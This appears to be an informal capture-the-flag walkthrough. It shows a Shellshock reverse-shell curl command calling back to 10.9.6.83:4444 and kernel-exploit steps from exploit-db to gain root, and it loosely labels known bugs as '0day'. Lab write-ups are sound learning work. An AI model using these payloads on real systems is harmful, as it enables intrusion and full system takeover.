## # nmap scan : 

22 : ssh
80 : http

## # directory FUZZ  :

/admin
/uploads
/cgi-bin
/secret

with more fuzzing : 
/cgi-bin/test.cgi

its a 0day to this file , get shell with this command : 

``curl -H “user-agent: () { :; }; echo; echo; /bin/bash -c ‘sh -i >& /dev/tcp/10.9.6.83/4444 0>&1’ “


## # privelege escalation : 

kerbel exploit : another 0day

https://www.exploit-db.com/exploits/37292

cd /tmp : to get the permission to download the exploit

download the exploit in our machine , and on a python server at any port

use wget to download the file in the target

complite using ``gcc 
find a error , dont find cc1 , taht is the responsable to convert C to assembly .

by modifiying the PATH to the normal PATH : 

``export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

chmod +x exploit
./exploit

and boom , rooooooooooooot